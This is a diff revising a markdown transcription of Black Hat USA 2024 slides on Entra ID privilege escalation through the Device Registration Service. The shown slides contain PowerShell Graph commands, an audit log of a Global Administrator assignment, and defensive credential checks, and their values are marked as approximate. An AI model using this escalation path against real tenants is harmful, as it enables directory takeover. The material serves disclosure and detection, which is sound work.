+BSub0kaAukSHWB4mGC_PMl9f7lxUaptNuRB5u7pzZQ4-1 5cee5f5f-6a54-4d9b-b910-79bbba73650e d29b2b05-8046-44ba-8758-1e26182fcf32
+LJnv8vs6uUa3z6Em7nTEUfTaHhBFa3pMhDM_tpKeOnM-1 101edaf4-6b45-4c7a-8433-3fb6929e3a73 f2ef992c-3afb-46b9-b7cf-a126ee74c451
+LJnv8vs6uUa3z6Em7nTEUckh2rvrn5lGndXWsugf6_I-1 bbda21c9-9feb-4699-9dd5-d6b2e81febf2 f2ef992c-3afb-46b9-b7cf-a126ee74c451
+5wuT_mJe20eRr5jDpJo4sfTaHhBFa3pMhDM_tpKeOnM-1 101edaf4-6b45-4c7a-8433-3fb6929e3a73 fe930be7-5e62-47db-91af-98c3a49a38b1
+Phy-sV22GU-EJ_b6DZf-ufTaHhBFa3pMhDM_tpKeOnM-1 101edaf4-6b45-4c7a-8433-3fb6929e3a73 b1be1c3e-b65d-4f19-8427-f6fa0d97feb9
+0gJe1hQCdEaOXXZvszDiwH9_a7vXTtZFpzUszwvtrdQ-1 bb6b7f7f-4ed7-45d6-a735-2ccf0bedadd4 d65e02d2-0214-4674-8e5d-766fb330e2c0
+NIwd6_WsDUaEJMHxpvvbhX9_a7vXTtZFpzUszwvtrdQ-1 bb6b7f7f-4ed7-45d6-a735-2ccf0bedadd4 eb1d8c34-acf5-460d-8424-c1f1a6fbdb85
+kl2Jm9Msx0SdAqasLV6lw8ibNp0FDYNPkJYhE-uX29U-1 9d369bc8-0d05-4f83-9096-2113eb97dbd5 9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3
+8MYkhImhnkm70CbBdTyW1CaCFNdEdIRIrve1_mk6Z5g-1 d7148226-7444-4884-aef7-b5fe693a6798 8424c6f0-a189-499e-bbd0-26c1753c96d4
+
+PS C:\temp> Remove-MgRoleManagementDirectoryRoleAssignment -UnifiedRoleAssignmentId lAPpYvVpN0KRkAEhdxReEEh0fnPGk3dGtpckSTWxrYA-1
+PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}
+
+DisplayName   Id                                   Mail                                            UserPrincipalName
+-----------   --                                   ----                                            -----------------
+Eric Woodruff d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@northwindt...
+Megan Bowen   936d55ce-a9b6-4a3b-ba1a-76340951d486 megan.bowen@northwindtraders.cloud              megan.bowen@northw...
+
 PS C:\temp>
-—— —
+
 Gathering our Global Administrator role members, with a different Global Administrator now removed
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 110
 
 **#BHUSA @BlackHatEvents** Verifying our activity in our Entra ID audit logs (output from testing findings in another tenant)
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 80/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-"id": "Directory aa2ffcab-c207-4627-89b8-55df£5295c687_Q2J8I_174301280",
-"category": "RoleManagement",
-"correlationId": "aa2ffcab-—c207-4627-89b8-55df5295c687",
-"result": [| "success",
-"resultReason": "",
-"activityDisplayName": |"Add member to role",
-"activityDateTime": "2024-01-05T21:16:16.26169372",
-"loggedByService": "Core Directory",
-"operationType": "Assign",
-"userAgent": null,
-"initiatedBy": {
-"user": null,
-"app": {
-"appiId": null,
-"displayName": |"Device Registration Service",
-"servicePrincipalId": "cb328f56-ab61-48d5-b1b9-129d7093b869",
-"servicePrincipalName": null
-}
-},
-"targetResources": [
 {
-"id": "alc70ab4-a66b-42b5-bfea-5d8c44904912",
-"displayName": null,
-"type": "User",
-"userPrincipalName": "ReneMagi7@M365x61605097.OnMicrosoft.com",
-"groupType": null,
-"modifiedProperties": [
-{
-"displayName": "Role.ObjectID",
-"oldValue": null,
-"newValue": "\"4fdbf417-b070-4a07-9337-1052f£356e826\""
-"displayName": "Role.DisplayName",
-"oldValue": null,
-"newValue": |["\"Global Administrator\""
+    "id": "Directory_aa2ffcab-c207-4627-89b8-55df5295c687_Q2J8I_174301280",
+    "category": "RoleManagement",
+    "correlationId": "aa2ffcab-c207-4627-89b8-55df5295c687",
+    "result": "success",
+    "resultReason": "",
+    "activityDisplayName": "Add member to role",
+    "activityDateTime": "2024-01-05T21:16:16.2616937Z",
+    "loggedByService": "Core Directory",
+    "operationType": "Assign",
+    "userAgent": null,
+    "initiatedBy": {
+        "user": null,
+        "app": {
+            "appId": null,
+            "displayName": "Device Registration Service",
+            "servicePrincipalId": "cb328f56-ab61-48d5-b1b9-129d7093b869",
+            "servicePrincipalName": null
+        }
+    },
+    "targetResources": [
+        {
+            "id": "a1c70ab4-a66b-42b5-bfea-5d8c44904912",
+            "displayName": null,
+            "type": "User",
+            "userPrincipalName": "ReneMagi7@M365x61605097.OnMicrosoft.com",
+            "groupType": null,
+            "modifiedProperties": [
+                {
+                    "displayName": "Role.ObjectID",
+                    "oldValue": null,
+                    "newValue": "\"4fdbf417-b070-4a07-9337-1052f356e826\""
+                },
+                {
+                    "displayName": "Role.DisplayName",
+                    "oldValue": null,
+                    "newValue": "\"Global Administrator\""
+                },
+
+Verifying our activity in our Entra ID audit logs (output from testing findings in another tenant)
 ```
 
 ## Slide 111
@@ -2764,15 +2641,6 @@ Gathering our Global Administrator role members, with a different Global Adminis
 # Microsoft response
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-blackhat  . -
-USA 2024
-Microsoft response
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 113
 
@@ -2879,18 +2747,13 @@ Entra ID
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 89/100 on the text kept, 84/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-PS C:\Temp> Connect-MGGraph -TenantID 1lae®@6df-10e8-U4b9e-bf66-2a91F4955339 —CLlientSecretCredential $CurrentCred
-Connect-MgGraph: ClientSecretCredential authentication failed: A configuration issue is preventing authentication - chec
-k the error message from the server for details. You can modify the configuration in the application registration portal
-See https://aka.ms/msal-net-invalid-client for details. Original exception: AADSTS7660215: Invalid client secret prov
-ided. Ensure the secret being sent in the request is the client secret value, not the client secret ID, for a secret add
-ed to app '01cb2876-7ebd-Yaa4-9cc9-d28bddd359a9'. Trace ID: f8eb1683-620a-4513-ad37-72fe7a7O4a08 Correlation ID: cb8d93e
-6-8148-4627-ba20-flc83f8ac99e Timestamp: 2024-06-05 12:38:222
+PS C:\Temp> Connect-MGGraph -TenantID 11ae06df-10e8-4b9e-bf66-2a91f4955339 -ClientSecretCredential $CurrentCred
+Connect-MgGraph: ClientSecretCredential authentication failed: A configuration issue is preventing authentication - check the error message from the server for details. You can modify the configuration in the application registration portal. See https://aka.ms/msal-net-invalid-client for details.  Original exception: AADSTS7000215: Invalid client secret provided. Ensure the secret being sent in the request is the client secret value, not the client secret ID, for a secret added to app '01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9'. Trace ID: f8eb1683-620a-4513-ad37-72fe7a704a00 Correlation ID: cb8d93e6-81f0-4627-ba20-f1c83f8ac99e Timestamp: 2024-06-05 12:38:22Z
 PS C:\Temp>
-- i 2 ; ks ee’ i #BHUSA @BlackHatEvents
 ```
 
 ## Slide 120
@@ -2898,16 +2761,6 @@ PS C:\Temp>
 # Defense
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-i =<
-black hat — -
-USA 2024
-Defense
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 121
 
@@ -3047,31 +2900,28 @@ Cloud Application Administrator
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 81/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-bisekhat
-USA 2024
-&) PowerShell
-PS C:\Temp> (Get-MGServicePrincipal "AppId
-CustomKeyIdentifier DisplayName EndDateTime
-{84, 101, 115, 116..} CN=com.foo.bar 6/13/2025 8:11:
-{84, 101, 115, 116..} CN=com.foo.bar 6/13/2025 8:11:
-PS C:\Temp> (Get-MGServicePrincipal "AppId
-CustomKeyIdentifier DisplayName EndDateTime
-10/10/2024 3:04:32 AM
-8/14/2024 7:23:57 PM
-8/5/2024 11:27:12 PM
+Looking for suspicious credentials
+
+PS C:\Temp> (Get-MGServicePrincipal -Filter "AppId eq '01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9'").KeyCredentials
+
+CustomKeyIdentifier    DisplayName    EndDateTime          Key KeyId                                StartDateTime
+-------------------    -----------    -----------          --- -----                                -------------
+{84, 101, 115, 116...} CN=com.foo.bar 6/13/2025 8:11:52 PM     c899c5a7-212a-432d-a757-b95f9e7c2936 6/13/2024 8:11:52 PM
+{84, 101, 115, 116...} CN=com.foo.bar 6/13/2025 8:11:52 PM     e3fef06b-0a7d-4c86-a87c-8100a50ab1b7 6/13/2024 8:11:52 PM
+
+PS C:\Temp> (Get-MGServicePrincipal -Filter "AppId eq '01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9'").PasswordCredentials
+
+CustomKeyIdentifier DisplayName EndDateTime           Hint KeyId                                SecretText StartDateTime
+------------------- ----------- -----------           ---- -----                                ---------- -------------
+                                10/10/2024 3:04:32 AM LoU  f1546c38-fa8e-44d4-94ba-9258ffe6195c            4/10/2024 3...
+                                8/14/2024 7:23:57 PM  sDN  aad0b6fa-99ea-4afa-ad4b-a901d2399413            2/14/2024 8...
+                                8/5/2024 11:27:12 PM  /sI  17abf52a-f6f7-434a-9254-7d86b1e5c6a6            2/6/2024 12...
+
 PS C:\Temp>
-'Q1cb2876-7ebd—4aa4—9cc9-d28bd4d359a9'") .KeyCredentials
-Key KeyId StartDateTime
-¢899c5a7—212a—-432d—a757—-b95F9e7cC2936 6/13/2024 8:11:52 PM
-PM e3fef06b-—0a7d—-4c86-—a87c-8100a50ab1b7 6/13/2024 8:11:52 PM
-'@1cb2876-7ebd—4aalt—Icc9-d28bd4d359a9'") .PasswordCredentials
-Hint KeyId SecretText StartDateTim
-LoU 1546c38-fa8e—4U4d4-94ba-9258FFe6195c 4/10/2024 3...
-sDN aad@b6fa-99ea-4afa-ad4b-a901d2399413 2/14/2024 8...
-/sI 17abf52a-f6f7-434a-9254-7d86ble5c6a6 2/6/2024 12...
 ```
 
 ## Slide 132
@@ -3128,14 +2978,12 @@ Looking for assignment of credentials to Device Registration Service using KQL i
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-i =<
 black hat — -
-USA 2024
 Thank you!
 cs @ericonidentity.com in /in/ericonidentity
 SX @ericonidentity m @ericonidentity@infosec.exchange
-#BHUSA @BlackHatEvents
 ```
